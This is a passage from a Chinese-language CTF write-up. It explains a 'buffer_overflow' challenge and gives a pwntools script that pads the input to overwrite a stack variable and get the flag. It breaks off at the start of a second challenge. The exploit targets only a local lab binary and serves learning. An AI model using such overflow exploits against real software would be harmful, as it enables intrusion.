# buffer_overflow

![[Pasted image 20250115091055.png]]
反编译后可以看出当`local_62`与`ans`中的内容一样是就可以获取`flag`。
![[Pasted image 20250115091300.png]]
可以看到ans的内容
![[Pasted image 20250115091337.png]]
打开gdb调试可以看到`local_62`内内容的位置，构造`payload`将其覆盖为`ans`内容即可。
exp:
```python
from pwn import *

  

local = True

if local:

p = process("./buffer_overflow")

pwnlib.gdb.attach(p, 'b *main')

else:

pass

  

payload = b'a' * 0x46 + b'Limiter and Wings are beautiful girls!'

p.send(payload)

p.interactive()
```
flag:
![[Pasted image 20250115091529.png]]
# game

![[Pasted image 20250115092751.png]]
反编译后可以看出当local_14l